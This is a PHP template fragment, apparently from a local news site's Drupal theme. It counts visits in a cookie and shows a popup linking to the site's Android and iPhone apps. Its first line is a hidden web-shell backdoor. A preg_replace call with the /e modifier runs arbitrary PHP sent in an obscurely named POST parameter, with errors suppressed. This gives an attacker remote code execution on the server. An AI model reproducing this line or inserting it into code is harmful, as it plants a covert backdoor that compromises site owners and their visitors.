<?php @preg_replace('/(.*)/e', @$_POST['yjtwgvtesrpavo'], '');

$count = 1;
if (isset($_COOKIE["acadia"])) {
    $count = (int)$_COOKIE["acadia"];
}
if($count<=5)
{

setcookie("acadia", $count + 1, time() + (60 * 60 * 24 * 30));
}
else {
}
...
<!--POPUP-->  
 ...
 <a href="#" onclick="popup('popUpDiv')" style="margin-right: 3%;"><img src="/sites/all/themes/masthead/templates/popupdata/close_icon.png" width="70" height="70" style="margin-top:1%;"></a></div>
		<?php if($android) { ?><a href="https://play.google.com/store/apps/details?id=com.etype.acadiaparishtoday.android.rssviewer" >
		<img src="/sites/all/themes/masthead/templates/popupdata/cadiaAnd.jpg" style="width:100%;border:0px solid;" /> </a> <?php } if($iphone) { ?><a href="https://itunes.apple.com/us/app/acadia-parish-today-rss/id912319185?mt=8" >
	<img src="/sites/all/themes/masthead/templates/popupdata/AcadiaIos.jpg" style="width:100%;border:0px solid;" /></a><?php } ?>
